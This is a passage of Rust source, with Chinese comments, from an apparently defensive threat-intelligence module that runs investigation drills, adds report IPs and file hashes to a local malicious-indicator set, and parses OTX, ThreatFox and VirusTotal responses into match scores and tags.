            port_opt,
            inline_payload_opt,
            socket_opt,
            ips_events,
            local_9006_online,
        );
        let out = Self::execute_job_offline(job);
        self.commit_job_output(out)
    }

    /// 内置离线攻防调查演练探针（涵盖网络攻击指纹 + 代码基因 DNA + 多情报库联动验证）
    pub fn run_investigation_drill(
        &mut self,
        drill_kind: &str,
        live_procs: &[LiveProcessRecord],
        sockets: &[NetworkSocketRecord],
        ips_events: &[IpsEvent],
        local_9006_online: bool,
    ) -> InvestigationReport {
        let job = self.prepare_drill_job(
            drill_kind,
            live_procs,
            sockets,
            ips_events,
            local_9006_online,
        );
        let out = Self::execute_job_offline(job);
        self.commit_job_output(out)
    }

    pub fn add_report_iocs_to_vault(&mut self, report_id: &str) -> Option<(String, u16, String, String)> {
        let rep = self.reports.iter_mut().find(|r| r.report_id == report_id)?;
        rep.linked_mitigation_done = true;
        let ip = rep.network_fp.remote_ip.clone();
        let port = rep.network_fp.port;
        let sha = rep.code_gene.file_sha256.clone();
        let proc_name = rep.process_name.clone();
        if !ip.is_empty() && ip != "127.0.0.1" && ip != "::1" && ip != "*" {
            self.custom_malicious_iocs.insert(ip.to_ascii_lowercase());
        }
        if !sha.is_empty() {
            self.custom_malicious_iocs.insert(sha.to_ascii_lowercase());
        }
        self.last_status_message = format!(
            "[INTEL-LINK] 已将调查报告 {} 的 IP/SHA-256 指纹写入本地情报库并下发阻断联动",
            report_id
        );
        self.save_persisted();
        Some((ip, port, proc_name, sha))
    }

    pub fn summary_json(&self) -> serde_json::Value {
        serde_json::json!({
            "total_feeds": self.feeds.len(),
            "enabled_feeds": self.enabled_feeds_count(),
            "reports_count": self.reports.len(),
            "custom_ioc_count": self.custom_malicious_iocs.len(),
            "feeds_overview": self.feeds.iter().map(|f| serde_json::json!({
                "feed_id": f.feed_id,
                "name": f.name,
                "endpoint": f.endpoint_url,
                "enabled": f.enabled,
                "weight": f.weight,
            })).collect::<Vec<_>>()
        })
    }
}

/// 统一解析 OTX / AbuseCH ThreatFox / VirusTotal v3 / 自定义 REST TIP 的 JSON 响应
fn parse_external_intel_json(
    kind: IntelFeedKind,
    body: &str,
) -> (bool, f32, Vec<String>, String) {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(body) else {
        let preview: String = body.chars().take(90).collect();
        return (false, 0.0, vec!["非 JSON 响应体".to_string()], preview);
    };

    match kind {
        IntelFeedKind::AlienVaultOtx => {
            let pulses = v["pulse_info"]["count"].as_u64().unwrap_or(0);
            let matched = pulses > 0;
            let conf = if pulses >= 5 {
                0.95
            } else if pulses >= 1 {
                0.78
            } else {
                0.05
            };
            let tags = if matched {
                vec![format!("OTX 命中 {} 个威胁情报脉冲", pulses)]
            } else {
                vec!["OTX 未记录威胁脉冲".to_string()]
            };
            (matched, conf, tags, format!("OTX pulse_info.count={}", pulses))
        }
        IntelFeedKind::AbuseChThreatFox => {
            let qstat = v["query_status"].as_str().unwrap_or("");
            let data_len = v["data"].as_array().map(|a| a.len()).unwrap_or(0);
            let matched = qstat == "ok" && data_len > 0;
            let malware = v["data"]
                .as_array()
                .and_then(|a| a.first())
                .and_then(|d| d["malware_printable"].as_str())
                .unwrap_or("Unknown");
            let tags = if matched {
                vec![format!("ThreatFox 命中 {} ({} 条 IOC)", malware, data_len)]
            } else {
                vec![format!("ThreatFox 状态: {}", qstat)]
            };
            (matched, if matched { 0.94 } else { 0.05 }, tags, format!("status={} hits={}", qstat, data_len))
        }
        IntelFeedKind::VirusTotalV3 => {
            let mal = v["data"]["attributes"]["last_analysis_stats"]["malicious"]
                .as_u64()
                .unwrap_or(0);
            let susp = v["data"]["attributes"]["last_analysis_stats"]["suspicious"]
                .as_u64()
                .unwrap_or(0);
            let matched = mal > 0 || susp >= 2;
            let conf = ((mal as f32) / 10.0).clamp(if matched { 0.65 } else { 0.0 }, 0.99);
            let tags = vec![format!("VirusTotal 检出: malicious={} suspicious={}", mal, susp)];
            (matched, conf, tags, format!("VT stats malicious={} suspicious={}", mal, susp))
        }
        IntelFeedKind::CustomRestTip | _ => {
            let mal_flag = v["malicious"].as_bool() == Some(true) || v["hit"].as_bool() == Some(true);
            let score = v["score"]
                .as_f64()
                .or_else(|| v["confidence"].as_f64())
                .unwrap_or(0.0) as f32;
            let norm_score = if score > 1.0 { score / 100.0 } else { score }.clamp(0.0, 1.0);
            let matched = mal_flag || norm_score >= 0.55;
            let mut tags = Vec::new();
            if let Some(fam) = v["family"].as_str().or_else(|| v["threat_label"].as_str()) {
                tags.push(format!("家族/标签: {}", fam));
            }
            if let Some(arr) = v["tags"].as_array() {
                for item in arr.iter().take(4) {
                    if let Some(s) = item.as_str() {
                        tags.push(s.to_string());
                    }
                }
            }
            if tags.is_empty() {
                tags.push(format!("自定义情报源评分: {:.0}%", norm_score * 100.0));
            }
            let summary = format!("matched={} score={:.2} family={}", matched, norm_score, v["family"].as_str().unwrap_or("-"));
            (matched, norm_score.max(if matched { 0.80 } else { 0.0 }), tags, summary)
        }
    }
}
